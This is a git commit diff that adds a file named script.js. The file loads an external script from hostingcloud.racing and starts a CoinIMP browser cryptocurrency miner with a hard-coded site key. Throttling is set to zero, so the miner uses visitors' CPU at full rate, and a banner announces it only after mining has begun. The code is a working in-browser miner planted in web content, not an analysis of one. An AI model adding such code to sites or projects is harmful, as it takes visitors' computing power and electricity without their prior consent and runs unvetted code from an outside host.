a045b8376f2d40fa0519d479b83c5f571ae437bd
MogdPages <maxim2005lu@gmail.com>
2024-10-11 22:38:43 +0800

    Add files via upload

---
+++ script.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/EYTe.js"></script>
+<script>
+    var _client = new Client.Anonymous('41acf8ce51c7ccca284a8ee64626efdc4d0754b385e4d6794b4a049a304e83b9', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+</script>
